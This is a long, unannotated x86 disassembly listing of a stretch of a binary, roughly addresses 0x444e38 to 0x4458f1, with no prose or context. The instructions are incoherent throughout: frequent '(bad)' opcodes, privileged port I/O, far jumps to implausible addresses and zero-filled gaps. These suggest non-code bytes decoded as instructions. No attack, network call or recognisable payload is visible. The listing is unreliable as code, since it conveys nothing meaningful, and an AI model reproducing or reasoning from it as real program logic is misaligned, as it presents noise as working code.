  444e38:	add    BYTE PTR [eax],al
  444e3a:	or     al,0x67
  444e3c:	std    
  444e3d:	xor    al,0x58
  444e3f:	xchg   ebx,eax
  444e40:	repz xor DWORD PTR [edi+0x66],0xfffffffd
  444e45:	call   DWORD PTR [edx]
  444e47:	fidiv  DWORD PTR [edi-0x50]
  444e4a:	cmp    ebx,DWORD PTR [ebp-0x3]
  444e4d:	push   DWORD PTR [edx+0x56]
  444e50:	std    
  444e51:	dec    DWORD PTR ds:0x5087864e
  444e57:	out    dx,eax
  444e58:	jbe    0x444de2
  444e5a:	pop    ecx
  444e5b:	push   eax
  444e5c:	std    
  444e5d:	call   esi
  444e5f:	push   DWORD PTR [ecx]
  444e61:	push   es
  444e62:	cmc    
  444e63:	or     BYTE PTR [edx-0x23044290],dl
  444e69:	add    ecx,DWORD PTR ds:0xef97b487
  444e6f:	dec    esp
  444e70:	inc    ebp
  444e71:	jns    0x444e48
  444e73:	pop    es
  444e74:	jo     0x444eb5
  444e76:	imul   esp,ecx,0x119573df
  444e7c:	out    0x3,eax
  444e7e:	mov    bh,cl
  444e80:	cli    
  444e81:	jns    0x444e10
  444e83:	mov    bh,0xf1
  444e85:	add    ecx,DWORD PTR ds:0x91f2eb88
  444e8b:	ret    0x302
  444e8e:	aad    0x13
  444e90:	outs   dx,BYTE PTR ds:[esi]
  444e91:	or     al,0x1
  444e93:	test   DWORD PTR [edi+0x308f88fb],ebp
  444e99:	out    dx,al
  444e9a:	sbb    bh,BYTE PTR [eax+0x5f]
  444e9d:	lock add BYTE PTR [eax],al
	...
  444ebc:	add    eax,0x1f477785
  444ec1:	add    bh,ah
  444ec3:	js     0x444e4b
  444ec5:	fs call 0xf7f56ff6
  444ecb:	fxch   st(0)
  444ecd:	ficom  WORD PTR [ebp-0x413a6f6c]
  444ed3:	jbe    0x444f0e
  444ed5:	or     dh,BYTE PTR [edi-0x2e4b8286]
  444edb:	add    ecx,DWORD PTR ds:0x2f883c8b
  444ee1:	mov    DWORD PTR [edi+0x4b],ebx
  444ee4:	pop    ds
  444ee5:	add    bh,ah
  444ee7:	cwde   
  444ee8:	sbb    bl,dh
  444eea:	pop    ebp
  444eeb:	inc    edi
  444eec:	jge    0x444ee2
  444eee:	in     al,dx
  444eef:	add    ecx,DWORD PTR ds:0x889c95de
  444ef5:	mov    BYTE PTR [eax],al
  444ef7:	xor    eax,0x7f977a8
  444efc:	xchg   esi,eax
  444efd:	scas   eax,DWORD PTR es:[edi]
  444efe:	mov    eax,0xfd000eff
  444f03:	stos   DWORD PTR es:[edi],eax
  444f04:	xchg   esi,eax
  444f05:	jg     0x444e8f
  444f07:	xchg   ebp,eax
  444f08:	push   0xbc02f977
  444f0d:	jg     0x444f62
  444f0f:	inc    ebp
  444f10:	popa   
  444f11:	mov    al,0x88
  444f13:	jg     0x444f79
  444f15:	ja     0x444f10
  444f17:	jbe    0x444f77
  444f19:	ja     0x444f14
  444f1b:	jmp    0xb4cbbd55
	...
  444f3c:	add    BYTE PTR [eax],al
  444f3e:	xchg   esi,eax
  444f3f:	jge    0x444ec9
  444f41:	pop    ebp
  444f42:	xor    BYTE PTR [edi-0x7],dh
  444f45:	rol    BYTE PTR [ecx-0x3e219f06],cl
  444f4b:	(bad)  
  444f4c:	mov    esp,0x87000ef3
  444f51:	xchg   esp,eax
  444f52:	jp     0x444f36
  444f54:	int3   
  444f55:	or     edx,DWORD PTR [ebp-0x2c9ff839]
  444f5b:	pop    ebx
  444f5c:	(bad)  
  444f5d:	lock sahf 
  444f5f:	mov    bh,0x12
  444f61:	jmp    0xfd94cc74
  444f66:	mov    BYTE PTR [edi-0x48],bh
  444f69:	test   DWORD PTR [esi],0x1ed8800
  444f6f:	jge    0x444fb4
  444f71:	lds    ecx,FWORD PTR [eax]
  444f73:	fcom   DWORD PTR [ebx]
  444f75:	(bad)  
  444f76:	fst    DWORD PTR [edx]
  444f78:	test   DWORD PTR [ecx],esp
  444f7a:	add    DWORD PTR [esi-0x70],edi
  444f7d:	pusha  
  444f7e:	daa    
  444f7f:	add    BYTE PTR [eax],al
  444f81:	jno    0x444fa8
  444f83:	or     DWORD PTR [ebp+0x11cd79],eax
  444f89:	jmp    0x1304a11
  444f8e:	mov    ch,0x5a
  444f90:	or     eax,0xc224c4b1
  444f95:	data16 ja 0x444f8a
  444f98:	or     BYTE PTR [ebp+0x1c],0x91
  444f9c:	push   esp
  444f9d:	or     ah,ah
  444f9f:	test   BYTE PTR [eax+0xbc],dl
	...
  444fbd:	add    BYTE PTR [eax],al
  444fbf:	add    BYTE PTR [edx+0x2],bh
  444fc2:	add    BYTE PTR [ebx-0x76a20947],cl
  444fc8:	pushf  
  444fc9:	mov    bl,0xe
  444fcb:	add    BYTE PTR [ebp+eiz*8+0x11],dh
  444fcf:	data16 fbstp TBYTE PTR [ebx+0x2640abc]
  444fd6:	pop    esi
  444fd7:	ror    ebx,cl
  444fd9:	imul   eax,DWORD PTR [edx],0x19acb8
  444fdf:	add    BYTE PTR [edi],dh
  444fe1:	dec    edi
  444fe2:	icebp  
  444fe3:	mov    DWORD PTR [edi+edi*1-0x7adbfff2],ebp
  444fea:	mov    BYTE PTR [edx+ecx*2-0x97cfffe],bh
  444ff1:	cmp    BYTE PTR [ebx-0x7],0x32
  444ff5:	add    BYTE PTR [ecx+ecx*4+0x79],bl
  444ff9:	out    0x5d,al
  444ffb:	rcl    esi,cl
  444ffd:	xchg   BYTE PTR [eax+0x8],cl
  445000:	jge    0x44504a
  445002:	frstor [esi-0x13]
  445005:	xchg   ecx,eax
  445006:	mov    eax,0x8301e416
  44500b:	push   eax
  44500c:	enter  0x8083,0xb8
  445010:	mov    edx,0xe8880001
  445015:	or     al,0x83
  445017:	inc    ebp
  445018:	enter  0x57fc,0x14
  44501c:	aas    
  44501d:	jns    0x44502c
  44501f:	mov    al,BYTE PTR [esp+esi*4+0xe]
	...
  44503f:	add    BYTE PTR [eax],al
  445041:	add    BYTE PTR ds:0x5488a67,cl
  445047:	fist   WORD PTR [eax]
  445049:	or     DWORD PTR [esi+0xd12b8d7],edx
  44504f:	mov    bh,BYTE PTR [bp+di-0x57]
  445053:	push   0x575c13d5
  445058:	sub    eax,esi
  44505a:	repz cmp DWORD PTR [esi+0x7d],ebp
  44505e:	dec    edi
  44505f:	(bad)  [ebx-0x28a4670]
  445065:	(bad)  
  445066:	jmp    0x445047
  445068:	mov    ah,0xb8
  44506a:	add    esp,DWORD PTR [edi-0x3]
  44506d:	out    0xbd,al
  44506f:	push   0x19f3fffd
  445074:	arpl   WORD PTR [edx+0x4],sp
  445077:	xlat   BYTE PTR ds:[ebx]
  445078:	mov    ah,0x12
  44507a:	or     eax,0xfbf8267
  44507f:	adc    BYTE PTR ds:0xbe673afe,dh
  445085:	adc    BYTE PTR ds:0x277cfd67,cl
  44508b:	jno    0x44509b
  44508d:	mov    DWORD PTR [eax+ebp*2],eax
  445090:	std    
  445091:	dec    DWORD PTR [edx]
  445093:	test   DWORD PTR ss:[esi+0x24fd6707],edi
  44509a:	add    al,0xf0
  44509c:	enter  0x96f7,0xee
  4450a0:	mov    edi,0x3c670d12
  4450a5:	leave  
	...
  4450c2:	add    BYTE PTR [eax],al
  4450c4:	jae    0x445084
  4450c6:	push   cs
  4450c7:	mov    cl,0x7d
  4450c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4450ca:	or     al,BYTE PTR [eax]
  4450cc:	or     eax,0x73ebd0f0
  4450d1:	call   0x4386:0x5f458562
  4450d8:	mov    cl,0xff
  4450da:	or     BYTE PTR [ebx],cl
  4450dc:	popf   
  4450dd:	mov    bh,0xf1
  4450df:	add    ecx,DWORD PTR ds:0x8b183789
  4450e5:	jg     0x445136
  4450e7:	sbb    cl,BYTE PTR ds:0x12086f00
  4450ed:	mov    DWORD PTR [eax+ebp*2],esp
  4450f0:	call   0x5e0c:0x158cdacc
  4450f7:	int3   
  4450f8:	adc    cl,BYTE PTR [edx+0x1fbb77]
  4450fe:	out    0x8b,eax
  445100:	and    DWORD PTR ds:0xdb1945e,eax
  445106:	out    0x3,eax
  445108:	nop
  445109:	repnz push edx
  44510b:	add    eax,ebp
  44510d:	or     edi,DWORD PTR [eax+0x14]
  445110:	xor    ecx,DWORD PTR [edx-0x37]
  445113:	push   esp
  445114:	mov    BYTE PTR fs:[ebx+edi*2+0x73eccb96],bl
  44511c:	mov    cl,BYTE PTR [edi+0xd1a5b]
  445122:	pop    esi
  445123:	xlat   BYTE PTR ds:[ebx]
  445124:	fstp   QWORD PTR ss:[edi-0x44]
	...
  445144:	add    BYTE PTR [eax],al
  445146:	gs or  eax,0x1f2803e7
  44514c:	or     DWORD PTR [ebp+edx*2+0xd03dd3f],0x906915de
  445157:	mov    BYTE PTR [ebx+0x41000d19],ah
  44515d:	or     esi,DWORD PTR [ebp+0xd03f9b8]
  445163:	call   FWORD PTR [ebx]
  445165:	jl     0x4450f9
  445167:	mov    BYTE PTR [ebx+0x6e000d19],al
  44516d:	mov    ebx,DWORD PTR [ecx+0xee9000a]
  445173:	cmc    
  445174:	mov    ebp,0xb6b91ac
  445179:	daa    
  44517a:	lods   eax,DWORD PTR ds:[esi]
  44517b:	jp     0x4451d0
  44517d:	lea    esp,[esp+eax*2-0x4399d22]
  445184:	xchg   BYTE PTR [esi*1+0x665906de],ah
  44518b:	push   cs
  44518c:	add    cl,ch
  44518e:	mov    eax,edx
  445190:	adc    esp,DWORD PTR [ebx-0x72]
  445193:	mov    eax,0x880ee912
  445198:	add    al,0xf8
  44519a:	xchg   ecx,eax
  44519b:	mov    edi,0xf56e8e3
  4451a0:	test   ecx,edx
  4451a2:	sbb    bh,BYTE PTR [edx-0x70]
  4451a5:	nop
  4451a6:	add    al,0x0
  4451a8:	add    BYTE PTR [edx+0x0],dh
	...
  4451c7:	add    BYTE PTR [esi-0x5],dl
  4451ca:	xchg   ebp,edx
  4451cc:	std    
  4451cd:	jl     0x44515f
  4451cf:	jne    0x4451c5
  4451d1:	(bad)  
  4451d2:	jmp    DWORD PTR [ecx+0x4b]
  4451d5:	addr16 inc eax
  4451d8:	sbb    ah,BYTE PTR [ebx-0x22372cf0]
  4451de:	int3   
  4451df:	push   es
  4451e0:	mov    DWORD PTR [edx-0x4b819f13],esi
  4451e6:	adc    ch,cl
  4451e8:	push   cs
  4451e9:	fiadd  WORD PTR [esi+0xe5641]
  4451ef:	jmp    0xe9436c9b
  4451f4:	push   cs
  4451f5:	fmulp  st(4),st
  4451f7:	retf   
  4451f8:	jmp    0x4451f3
  4451fa:	(bad)  
  4451fb:	mov    eax,ds:0x6a000023
  445200:	dec    eax
  445201:	jne    0x4451eb
  445203:	clc    
  445204:	adc    DWORD PTR [eax],eax
  445206:	add    BYTE PTR [eax],al
  445208:	fld    TBYTE PTR [ecx-0x1213978]
  44520e:	jmp    FWORD PTR [edx]
  445210:	popf   
  445211:	test   BYTE PTR [ebp-0x8],al
  445214:	das    
  445215:	test   BYTE PTR [esi+edx*1-0x30cd014c],bh
  44521c:	sbb    bl,BYTE PTR [ebx+0x8]
  44521f:	mov    bh,0x34
  445221:	enter  0x1,0xb4
  445225:	or     DWORD PTR [ebp-0x14],0x12
  445229:	iret   
  44522a:	(bad)  [ebx+0x0]
	...
  445248:	add    BYTE PTR [eax],al
  44524a:	fadd   QWORD PTR [ebx]
  44524c:	add    DWORD PTR [ebp-0x80],0x3c900259
  445253:	or     al,BYTE PTR [eax]
  445255:	add    bh,bh
  445257:	dec    ebx
  445258:	or     eax,0xeb3e48a
  44525d:	add    BYTE PTR [esi+eax*4+0x4],ah
  445261:	adc    edi,ebp
  445263:	dec    eax
  445264:	fld    QWORD PTR [ecx]
  445266:	lods   al,BYTE PTR ds:[esi]
  445267:	or     al,BYTE PTR [ebx+0x48854078]
  44526d:	or     dh,ch
  44526f:	mov    esi,DWORD PTR [ecx-0x7801cbea]
  445275:	adc    al,0x3b
  445277:	test   DWORD PTR [eax-0x1bd44],edx
  44527d:	mov    bl,BYTE PTR [ecx+0x2057f8e2]
  445283:	stos   DWORD PTR es:[edi],eax
  445284:	adc    BYTE PTR [edx],ch
  445286:	ficomp WORD PTR [ecx-0x34]
  445289:	out    dx,eax
  44528a:	lahf   
  44528b:	push   eax
  44528c:	icebp  
  44528d:	lea    esi,[eax+0x8]
  445290:	lock mov DWORD PTR [eax+eax*2+0xe],esp
  445295:	add    ah,dh
  445297:	xchg   BYTE PTR [ebp-0x4],cl
  44529a:	push   edx
  44529b:	cmp    DWORD PTR [eax-0x28ef248],0xffffffff
  4452a2:	test   BYTE PTR [edi],0xe2
  4452a5:	test   BYTE PTR [ebp+0xd0007a3],ah
  4452ab:	mov    ecx,0xe14c
	...
  4452cc:	xchg   bh,bl
  4452ce:	mov    eax,0xe3670d12
  4452d3:	push   es
  4452d4:	test   edi,ebx
  4452d6:	adc    al,BYTE PTR [eax]
  4452d8:	or     eax,0x84f7d066
  4452dd:	fistp  QWORD PTR [eax-0x7998f2ee]
  4452e3:	mov    BYTE PTR [ecx+0x51],ah
  4452e6:	std    
  4452e7:	dec    DWORD PTR [esi-0x6b82875b]
  4452ed:	pusha  
  4452ee:	sti    
  4452ef:	push   esi
  4452f0:	xchg   esp,eax
  4452f1:	or     al,0x70
  4452f3:	bound  ebx,QWORD PTR [esi-0x3b]
  4452f6:	test   DWORD PTR [eax+0x5],ecx
  4452f9:	lock (bad) 
  4452fb:	jecxz  0x4452e8
  4452fd:	pop    edi
  4452fe:	lea    edi,[eax-0x7b0298fd]
  445304:	mov    ebp,0x95808752
  445309:	dec    ecx
  44530a:	std    
  44530b:	inc    DWORD PTR [ebp-0x2f7aeb9d]
  445311:	mov    edx,0xee195803
  445316:	hlt    
  445317:	adc    eax,DWORD PTR [edi+0xd12bbf7]
  44531d:	xchg   BYTE PTR [bx+si+0x15],cl
  445321:	fist   WORD PTR [eax]
  445323:	or     DWORD PTR [esi+0xd12b8d7],edx
  445329:	xchg   BYTE PTR [bp+di+0x21],bh
  44532d:	push   0x13d5
	...
  44534e:	mov    esp,0x6bc62756
  445353:	add    BYTE PTR [esi-0x2dc18793],dh
  445359:	mov    ebx,DWORD PTR [ebp+0xd03f9b3]
  44535f:	ficomp DWORD PTR [edi-0x44]
  445362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445363:	or     edi,esp
  445365:	add    esi,eax
  445367:	or     al,0x41
  445369:	push   ecx
  44536a:	mov    bl,0xd9
  44536c:	fist   WORD PTR [ebx+0x3e70985]
  445372:	inc    eax
  445373:	aas    
  445374:	jmp    0xd03:0xf1b3858a
  44537b:	test   DWORD PTR [eax+edi*2],esp
  44537e:	clc    
  44537f:	dec    ebp
  445380:	pusha  
  445381:	div    DWORD PTR [esi+0x4f7b07a]
  445387:	mov    bh,0x6d
  445389:	add    al,0xd
  44538b:	add    BYTE PTR [edx-0x19037d39],ch
  445391:	add    ecx,DWORD PTR ds:0x6a390165
  445397:	jmp    0x3e7:0xfbae8
  44539e:	dec    esp
  44539f:	mov    edx,0xd014e
  4453a4:	out    0x68,eax
  4453a6:	or     DWORD PTR [edi+0xd03e2],esi
  4453ac:	sub    al,bh
  4453ae:	inc    edx
  4453af:	sti    
  4453b0:	out    0x3,al
	...
  4453ce:	add    BYTE PTR [eax],al
  4453d0:	or     eax,0x1173ac7d
  4453d5:	daa    
  4453d6:	mov    esp,0x337b046b
  4453db:	jp     0x445401
  4453dd:	jo     0x445389
  4453df:	fnstsw WORD PTR [ecx+0x59df0c84]
  4453e5:	inc    ebx
  4453e6:	sub    edx,DWORD PTR [eax+0x41]
  4453e9:	inc    ebx
  4453ea:	add    BYTE PTR [ebp+edx*4-0x359db0a4],bl
  4453f1:	pop    es
  4453f2:	test   DWORD PTR [edi-0x46],esi
  4453f5:	adc    al,BYTE PTR [eax]
  4453f7:	jmp    0xd83d56d9
  4453fc:	imul   ebp,DWORD PTR [ecx+0x51],0xf92
  445403:	jmp    0x3f49cb95
  445408:	mov    ebx,0xb09984e1
  44540d:	cmp    al,0xde
  44540f:	(bad)  
  445410:	rcl    BYTE PTR [ebx],1
  445412:	xchg   DWORD PTR [ecx*4+0x767706e2],ebp
  445419:	adc    al,BYTE PTR [eax]
  44541b:	jmp    0x634c26b5
  445420:	mov    BYTE PTR [eax+0x780ee912],ch
  445426:	add    al,0xd8
  445428:	bswap  edx
  44542a:	adc    esp,DWORD PTR [ebx-0x60]
  44542d:	mov    bh,0x12
  44542f:	jmp    0xfdbed942
	...
  445450:	add    BYTE PTR [eax],al
  445452:	test   DWORD PTR [edx+0x6b4b7207],edi
  445458:	mov    ch,bh
  44545a:	sbb    DWORD PTR [ebp-0x7726e],eax
  445460:	jmp    edi
  445462:	cmp    BYTE PTR [ebx],dl
  445464:	scas   eax,DWORD PTR es:[edi]
  445465:	fldenv [esi+eax*2]
  445468:	bound  ebx,QWORD PTR [edx]
  44546a:	mov    dh,0xec
  44546c:	mov    ebp,0xbc929734
  445471:	dec    DWORD PTR [esi]
  445473:	add    BYTE PTR [edx+0x70],ah
  445476:	mov    BYTE PTR [eax+0x650ee912],ch
  44547c:	or     eax,0x625fbd87
  445481:	add    BYTE PTR ds:0x2416b885,bl
  445487:	add    edi,DWORD PTR [ebx-0x3f]
  44548a:	stc    
  44548b:	jns    0x445413
  44548d:	mov    esp,0x8b0002da
  445492:	sub    eax,edi
  445494:	or     BYTE PTR [esi+0x1190],0x2c
  44549b:	xchg   ecx,esi
  44549d:	or     edx,DWORD PTR [edx+0x52]
  4454a0:	pop    edi
  4454a1:	mov    esi,DWORD PTR [ecx+eiz*2-0x34]
  4454a5:	loop   0x445506
  4454a7:	cmp    cl,BYTE PTR ds:0x5de7f989
  4454ad:	or     DWORD PTR [edx-0x54],ebx
  4454b0:	push   cs
  4454b1:	add    BYTE PTR [ebp+edi*2+0x84e],ah
	...
  4454d4:	cmp    BYTE PTR ds:[eax-0x77fd4bea],0x4
  4454dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4454dd:	add    edx,DWORD PTR [esi+0x14]
  4454e0:	push   ds
  4454e1:	xchg   edx,eax
  4454e2:	mov    cl,0x16
  4454e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4454e5:	add    al,BYTE PTR [ebx+0x467d687e]
  4454eb:	or     bh,ch
  4454ed:	inc    eax
  4454ee:	cmc    
  4454ef:	mov    BYTE PTR [eax-0x7],bh
  4454f2:	adc    BYTE PTR [esi+0x1190],0x75
  4454f9:	dec    eax
  4454fa:	or     eax,0xc21c64b1
  4454ff:	neg    bx
  445502:	jp     0x4454c6
  445504:	sbb    DWORD PTR [ebp-0x72],edi
  445507:	mov    esp,0x6600026a
  44550c:	lods   eax,DWORD PTR ds:[esi]
  44550d:	cmp    DWORD PTR [eax-0x1cfddbea],0xdfd58a13
  445517:	or     ax,0x7f60
  44551b:	mov    eax,0x7cfd58fb
  445520:	dec    esp
  445521:	pop    ebx
  445522:	mov    WORD PTR [edx-0x2a9af],cs
  445528:	xchg   esi,eax
  445529:	pushf  
  44552a:	or     eax,0xe1b9385
  44552f:	add    BYTE PTR ds:0x8efc3cda,cl
  445535:	pusha  
  445536:	add    DWORD PTR [edx+0x0],edi
	...
  445555:	add    BYTE PTR [ebx-0x43],al
  445558:	mov    al,dl
  44555a:	imul   ebp,DWORD PTR [edx+0x4b4b8563],0xffffff8c
  445561:	inc    ebx
  445562:	rol    ebp,1
  445564:	or     dl,BYTE PTR [edx-0x2b27b]
  44556a:	xchg   esi,eax
  44556b:	adc    eax,0xdf93860c
  445570:	push   cs
  445571:	add    BYTE PTR ds:0xc0ef8ef,cl
  445577:	xor    eax,0xd07b8610
  44557c:	push   cs
  44557d:	add    BYTE PTR ds:0x8613f6f2,cl
  445583:	sbb    eax,0xf2d0850c
  445588:	test   BYTE PTR [edx+edx*1],dl
  44558b:	loop   0x44551b
  44558d:	mov    esp,0xfefd5723
  445592:	shl    BYTE PTR [edx-0x4c],1
  445595:	adc    BYTE PTR [edi],dh
  445597:	and    edi,ebx
  445599:	int3   
  44559a:	jne    0x445576
  44559c:	inc    edx
  44559d:	hlt    
  44559e:	test   ch,cl
  4455a0:	mov    al,0x12
  4455a2:	or     eax,0x9386df57
  4455a7:	out    dx,eax
  4455a8:	push   cs
  4455a9:	add    BYTE PTR ds:0x5e6211c2,cl
  4455af:	add    BYTE PTR [edi],al
  4455b1:	loope  0x4455be
  4455b3:	xchg   BYTE PTR [edi+0x11],bl
  4455b6:	or     eax,0x446600
	...
  4455d7:	add    BYTE PTR [ecx],cl
  4455d9:	ja     0x445634
  4455db:	mov    bh,0xff
  4455dd:	jmp    esi
  4455df:	ss adc al,0x27
  4455e2:	jl     0x4455f7
  4455e4:	adc    al,0x7e
  4455e6:	push   ecx
  4455e7:	add    ecx,DWORD PTR ds:0xb9895e00
  4455ed:	adc    eax,0x677003e7
  4455f2:	in     al,dx
  4455f3:	stc    
  4455f4:	ins    BYTE PTR es:[edi],dx
  4455f5:	std    
  4455f6:	cwde   
  4455f7:	xchg   ecx,eax
  4455f8:	add    ecx,eax
  4455fa:	es add al,0x4
  4455fd:	mov    ch,0x6b
  4455ff:	xchg   edx,eax
  445600:	push   edi
  445601:	cli    
  445602:	out    0x3,al
  445604:	das    
  445605:	jns    0x44559e
  445607:	loop   0x4455da
  445609:	popa   
  44560a:	pop    esi
  44560b:	retf   0xe61e
  44560e:	out    dx,eax
  44560f:	xchg   ecx,eax
  445610:	jne    0x445627
  445612:	out    0x3,eax
  445614:	adc    al,0xb6
  445616:	jno    0x4455d4
  445618:	(bad)  
  445619:	jmp    esi
  44561b:	mov    WORD PTR [edi],?
  44561d:	clc    
  44561e:	outs   dx,BYTE PTR ds:[esi]
  44561f:	sbb    BYTE PTR [edx],al
  445621:	ins    DWORD PTR es:[edi],dx
  445622:	and    DWORD PTR [eax],edx
  445624:	adc    al,0xb6
  445626:	push   ecx
  445627:	mov    ebx,0x8ce7001f
  44562c:	(bad)  
  44562d:	adc    ebp,DWORD PTR [esi-0x2e]
  445630:	or     bh,BYTE PTR [eax-0x5]
  445633:	adc    dl,BYTE PTR [eax+0xd129395]
  445639:	add    BYTE PTR [eax+0x14],bl
	...
  445657:	add    BYTE PTR [eax],al
  445659:	add    BYTE PTR [ebx],dh
  44565b:	cmp    cl,cl
  44565d:	push   esp
  44565e:	gs test al,0xe8
  445661:	add    ecx,DWORD PTR ds:0x64e80000
  445667:	adc    BYTE PTR [ebp+0x2b],bh
  44566a:	shl    cl,0x86
  44566d:	outs   dx,DWORD PTR ds:[esi]
  44566e:	jno    0x445681
  445670:	add    cl,ch
  445672:	xchg   edi,eax
  445673:	xchg   ecx,eax
  445674:	mov    esp,0xe5000eff
  445679:	retf   
  44567a:	add    eax,0x49e581b2
  44567f:	sub    al,0x0
  445681:	xchg   DWORD PTR [ecx+0x10778294],ebx
  445687:	add    BYTE PTR [eax],al
  445689:	xchg   DWORD PTR [ecx+0x4a],esp
  44568c:	(bad)  
  44568d:	lock pushf 
  44568f:	test   al,0x12
  445691:	jmp    0xeb0343a4
  445696:	xchg   edi,eax
  445697:	jbe    0x445655
  445699:	test   DWORD PTR [esi],0x11c1fd00
  44569f:	out    0xf,eax
  4456a1:	out    dx,al
  4456a2:	xchg   edx,eax
  4456a3:	retf   0xb6f8
  4456a6:	inc    ebp
  4456a7:	test   DWORD PTR [ebx-0x1f],ecx
  4456aa:	(bad)  
  4456ab:	jbe    0x44563f
  4456ad:	jge    0x4456bd
  4456af:	add    BYTE PTR [eax],al
  4456b1:	jb     0x4456ff
  4456b3:	pop    eax
  4456b4:	dec    ebx
  4456b5:	xchg   ecx,eax
  4456b6:	and    eax,0x51c8569
  4456bb:	ret    
  4456bc:	mov    bl,BYTE PTR [edi+0x0]
	...
  4456db:	add    BYTE PTR [esi-0x6616fffd],al
  4456e1:	ds call 0xf9ad5d9c
  4456e7:	push   cs
  4456e8:	pop    eax
  4456e9:	test   bl,ah
  4456eb:	(bad)  
  4456ec:	leave  
  4456ed:	cmp    ecx,esp
  4456ef:	sub    eax,0xbccc3bd2
  4456f4:	xchg   ecx,eax
  4456f5:	pop    esp
  4456f6:	jge    0x445735
  4456f8:	(bad)  
  4456f9:	mov    esp,0xf7a90084
  4456fe:	sub    cl,cl
  445700:	mov    ds:0x94883250,al
  445705:	adc    DWORD PTR [eax],eax
  445707:	add    BYTE PTR [ebx-0x15],bl
  44570a:	mov    dl,0x0
  44570c:	and    al,0xff
  44570e:	loop   0x445717
  445710:	mov    ecx,0xaf001d4a
  445715:	inc    ecx
  445716:	in     eax,dx
  445717:	mov    edx,DWORD PTR [edx+ecx*4-0x7dbfff2]
  44571e:	scas   al,BYTE PTR es:[edi]
  44571f:	adc    al,0xbe
  445721:	jnp    0x4456d3
  445723:	cwde   
  445724:	loop   0x445724
  445726:	dec    DWORD PTR [esi]
  445728:	inc    edx
  445729:	sbb    ebp,DWORD PTR [ecx]
  44572b:	inc    ecx
  44572c:	jge    0x445767
  44572e:	in     eax,dx
  44572f:	mov    ebx,DWORD PTR [eax+ebp*4+0xe]
  445733:	add    ah,dh
  445735:	jnp    0x445784
  445737:	cld    
  445738:	jno    0x445708
  44573a:	push   es
  44573b:	test   eax,esp
  44573d:	add    eax,DWORD PTR [eax]
	...
  44575b:	add    BYTE PTR [eax],al
  44575d:	add    BYTE PTR [ebx-0x494c8367],bh
  445763:	test   al,0x10
  445765:	add    BYTE PTR [esi+edi*8-0x475028de],ah
  44576c:	jne    0x4457c2
  44576e:	mov    ebx,0x12b33499
  445773:	ja     0x445743
  445775:	push   di
  445777:	fld    QWORD PTR [edx+0x24c9c48]
  44577d:	nop
  44577e:	int3   
  44577f:	stc    
  445780:	(bad)  
  445781:	jmp    FWORD PTR [ebx-0x64]
  445784:	cwde   
  445785:	mov    eax,0x8afffe62
  44578a:	mov    ah,0xfa
  44578c:	xchg   DWORD PTR [eiz*2+0xd143ff1],ebx
  445793:	bound  ebp,QWORD PTR [ebx-0x28d6b68]
  445799:	inc    DWORD PTR [esi-0x227af650]
  44579f:	jo     0x445726
  4457a1:	sbb    al,0x1c
  4457a3:	ficom  WORD PTR [ebx-0x2a6dc44]
  4457a9:	clc    
  4457aa:	int    0x6c
  4457ac:	xchg   BYTE PTR [ebx+0x15],bl
  4457af:	enter  0x2613,0x57
  4457b3:	jp     0x445803
  4457b5:	jmp    0xefab:0xf0378c88
  4457bc:	mov    bl,0xb8
  4457be:	and    edx,DWORD PTR [edi-0x3]
  4457c1:	in     al,0x0
	...
  4457df:	add    BYTE PTR ds:0xbe148679,bl
  4457e5:	or     DWORD PTR [esi-0x22],0xb88d706b
  4457ec:	add    edx,DWORD PTR [edi-0x3]
  4457ef:	cld    
  4457f0:	shl    eax,cl
  4457f2:	test   BYTE PTR [ebx+eax*1+0x4084fd57],bh
  4457f9:	stos   DWORD PTR es:[edi],eax
  4457fa:	mov    BYTE PTR ss:[ebp+0x51],ch
  4457fe:	std    
  4457ff:	call   DWORD PTR [edx]
  445801:	aad    0xc5
  445803:	clc    
  445804:	mov    edx,0x76b1029a
  445809:	push   ebp
  44580a:	stc    
  44580b:	jmp    FWORD PTR [edx-0x4437b12]
  445811:	push   esi
  445812:	std    
  445813:	mov    ch,0xfd
  445815:	push   esi
  445816:	std    
  445817:	jmp    esi
  445819:	mov    DWORD PTR [esi],esi
  44581b:	(bad)  
  44581c:	sbb    bl,cl
  44581e:	cmp    eax,0x25782fe
  445823:	mov    cl,0xbe
  445825:	push   edi
  445826:	stc    
  445827:	push   DWORD PTR [edx+0x0]
  44582a:	leave  
  44582b:	mov    bh,BYTE PTR [edi]
  44582d:	loop   0x445864
  44582f:	popa   
  445830:	mov    BYTE PTR [eax-0x6fec2222],bh
  445836:	(bad)  
  445837:	or     eax,0xadf2000d
  44583c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44583d:	test   al,0xd1
  44583f:	add    ecx,DWORD PTR ds:0xf9775
	...
  445861:	add    BYTE PTR [ebp-0x328927f4],al
  445867:	adc    esi,edx
  445869:	lods   eax,DWORD PTR ds:[esi]
  44586a:	test   DWORD PTR [edi+0x750d03f1],esp
  445870:	lahf   
  445871:	seto   al
  445874:	fimul  WORD PTR [ebx-0x6c91f10f]
  44587a:	leave  
  44587b:	adc    edi,esp
  44587d:	add    eax,DWORD PTR [eax+eax*8]
  445880:	fidiv  DWORD PTR [ebp+ebx*1-0x3e22e2ea]
  445887:	pop    ecx
  445888:	je     0x445852
  44588a:	and    BYTE PTR [eax+0x3a],dh
  44588d:	mov    edx,DWORD PTR [ebp+0xd03f9ab]
  445893:	loop   0x4458f4
  445895:	mov    ah,0x95
  445897:	adc    edi,esp
  445899:	add    esp,DWORD PTR [edi-0x3b]
  44589c:	ins    DWORD PTR es:[edi],dx
  44589d:	pop    edi
  44589e:	cmp    ax,0xade2
  4458a2:	ja     0x445913
  4458a4:	sbb    eax,0x59f9b2c4
  4458a9:	nop
  4458aa:	pusha  
  4458ab:	add    ebx,esp
  4458ad:	add    ecx,DWORD PTR ds:0xd03f7a5
  4458b3:	add    BYTE PTR [esi+0x7ed28a59],bh
  4458b9:	mov    esi,ebx
  4458bb:	idiv   DWORD PTR [ebp-0x20f8b8]
  4458c1:	in     eax,0xa9
  4458c3:	xchg   ebx,eax
  4458c4:	mov    dh,0xe5
	...
  4458e2:	add    BYTE PTR [eax],al
  4458e4:	jb     0x44594e
  4458e6:	stc    
  4458e7:	jo     0x445943
  4458e9:	pop    eax
  4458ea:	bound  edi,QWORD PTR [edx]
  4458ec:	out    dx,eax
  4458ed:	or     BYTE PTR [eax-0x1f],0x38
  4458f1:	add    DWORD PTR [eax+0x391],edx
